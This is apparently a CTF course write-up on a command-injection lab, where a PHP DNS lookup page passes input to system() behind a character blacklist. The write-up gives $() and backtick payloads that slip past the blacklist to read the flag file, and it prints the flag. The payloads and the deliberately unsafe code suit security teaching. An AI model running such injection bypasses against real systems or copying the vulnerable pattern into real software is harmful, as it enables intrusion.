---
title: Simple Web 0x10(Lab - DNS Lookup Tool | WAF)
tags: [NTUSTWS, CTF, Web]

category: "Security/Course/NTUST WS/Command Injection"
---

# Simple Web 0x10(Lab - DNS Lookup Tool | WAF)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`

## Background
[2022/03/30 網頁安全](https://youtu.be/7b8uMzpCfug?t=3612)
[Command injection](https://lab.feifei.tw/practice/ci/l1.php)

## Source code
:::spoiler code
```php=
 <?php
isset($_GET['source']) and die(show_source(__FILE__, true));
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DNS Lookup Tool | WAF</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css">
</head>

<body>
    <section class="section">
        <div class="container">
            <div class="column is-6 is-offset-3 has-text-centered">
                <div class="box">
                    <h1 class="title">DNS Lookup Tool 🔍 | WAF Edition</h1>
                    <form method="POST">
                        <div class="field">
                            <div class="control">
                                <input class="input" type="text" name="name" placeholder="example.com" id="hostname" value="<?= $_POST['name'] ?? '' ?>">
                            </div>
                        </div>
                        <button class="button is-block is-info is-fullwidth">
                            Lookup!
                        </button>
                    </form>
                    <br>
                    <?php if (isset($_POST['name'])) : ?>
                        <section class="has-text-left">
                            <p>Lookup result:</p>
                            <pre>
                            <?php
                            $blacklist = ['|', '&', ';', '>', '<', "\n", 'flag'];
                            $is_input_safe = true;
                            foreach ($blacklist as $bad_word)
                                if (strstr($_POST['name'], $bad_word) !== false) $is_input_safe = false;

                            if ($is_input_safe)
                                system("host '" . $_POST['name'] . "';");
                            else
                                echo "HACKER!!!";
                            ?>
                            </pre>
                        </section>
                    <?php endif; ?>
                    <hr>
                    <a href="/?source">Source Code</a>
                </div>
            </div>
        </div>
    </section>
</body>

</html> 
```
:::
It set some protection such as blacklist.

## Exploit
Use <font color="FF0000">**`$`** or **\`**</font> string to bypass blacklist
Payload: 
`'$(cat /fla*)'`
`'`cat /fl\*g\*`'`


Flag: FLAG{Y0U_$(Byp4ssed)\_th3\_\`waf\`}

## Reference